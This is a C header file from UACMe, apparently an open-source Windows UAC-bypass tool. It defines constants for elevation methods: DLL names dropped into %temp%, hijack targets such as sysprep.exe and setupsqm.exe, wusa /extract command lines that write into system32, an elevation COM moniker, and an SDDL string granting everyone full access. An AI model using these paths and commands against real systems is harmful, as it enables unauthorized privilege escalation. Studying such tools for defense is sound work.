/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2016
*
*  TITLE:       CONSTS.H
*
*  VERSION:     2.00
*
*  DATE:        16 Nov 2015
*
*  Global consts definition file.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

#define T_IFEO                L"MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
#define T_AVRFDLL             L"Hibiki.dll"
#define T_AVRF_SOURCEDLL      L"%temp%\\Hibiki.dll"
#define T_AVRF_CMDLINE        L"/c wusa %ws /extract:%%windir%%\\system32"
#define T_WINSATSRC           L"%temp%\\winsat.exe"
#define T_WINSAT_CMDLINE      L"/c wusa %ws /extract:%%windir%%\\system32\\sysprep"
#define T_WINSAT_TARGET       L"%systemroot%\\system32\\sysprep\\winsat.exe"

#define T_IIS_TARGETDIR       L"%systemroot%\\system32\\inetsrv"
#define T_IIS_TARGETAPP       L"InetMgr.exe"
#define T_IIS_TARGETDLL       L"SLC.dll"

//
// Standard elevation methods.
//
#define M1W7_SOURCEDLL         L"%temp%\\CRYPTBASE.dll"
#define M1W7_TARGETDIR         L"%systemroot%\\system32\\sysprep\\"
#define M1W7_TARGETPROCESS     L"%systemroot%\\system32\\sysprep\\sysprep.exe"
#define M1W8_SOURCEDLL         L"%temp%\\shcore.dll"
#define M1WALL_SOURCEDLL       L"%temp%\\wdscore.dll"
#define M1W7T_SOURCEDLL        L"%temp%\\ActionQueue.dll"
#define M1W10_SOURCEDLL        L"%temp%\\dbgcore.dll"
#define M1WALL_TARGETDIR       L"%systemroot%\\system32\\oobe\\"
#define M1WALL_TARGETPROCESS   L"%systemroot%\\system32\\oobe\\setupsqm.exe"
#define IFILEOP_ELEMONIKER     L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}"
#define SYSTEMROOTDIR          L"%systemroot%\\system32\\"
#define WBEMDIR                L"%systemroot%\\system32\\wbem"
#define TEMPDIR                L"%temp%\\"

#define T_UACKEY                    L"MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system"
#define T_SDDL_ALL_FOR_EVERYONE     L"D:(A;;GA;;;WD)"

//default fake msu cabinet name
#define T_MSUPACKAGE_NAME           L"%temp%\\ellocnak.msu"

#define METHOD_MIGWIZ_SOURCEDLL     L"%temp%\\wdscore.dll"
#define METHOD_MIGWIZ_CMDLINE       L"/c wusa %ws /extract:%%windir%%\\system32\\migwiz"
#define METHOD_MIGWIZ_TARGETAPP     L"%systemroot%\\system32\\migwiz\\migwiz.exe"

#define METHOD_SQLSRV_SOURCEDLL     L"%temp%\\ntwdblib.dll"
#define METHOD_SQLSRV_CMDLINE       L"/c wusa %ws /extract:%%windir%%\\system32"
#define METHOD_SQLSRV_TARGETAPP     L"%systemroot%\\system32\\cliconfg.exe"


#define PROGRAMTITLE TEXT("#UACMe#")
#define WOW64STRING TEXT("Apparently it seems you are running under WOW64.\n\r\
This is not supported, run x64 version of this tool.")
#define WOW64WIN32ONLY TEXT("This method only works with x86-32 Windows or from Wow64")
#define WIN64ONLY TEXT("Thos method only works with x86-64 Windows")
#define LAZYWOW64UNSUPPORTED TEXT("Use 32 bit version of this tool on 32 bit OS version")
#define OSTOOOLD TEXT("This method require Window 7 and above")
#define UACFIX TEXT("This method fixed/unavailable in the current version of Windows, do you still want to continue?")
#define RESULTOK TEXT("Bye-bye!")
#define RESULTFAIL TEXT("Something went wrong")
#define T_AKAGI_KEY    L"Software\\Akagi"
#define T_AKAGI_PARAM  L"LoveLetter"

#define T_KERNEL32 L"kernel32.dll"
#define T_OLE32    L"ole32.dll"
#define T_SHELL32  L"shell32.dll"
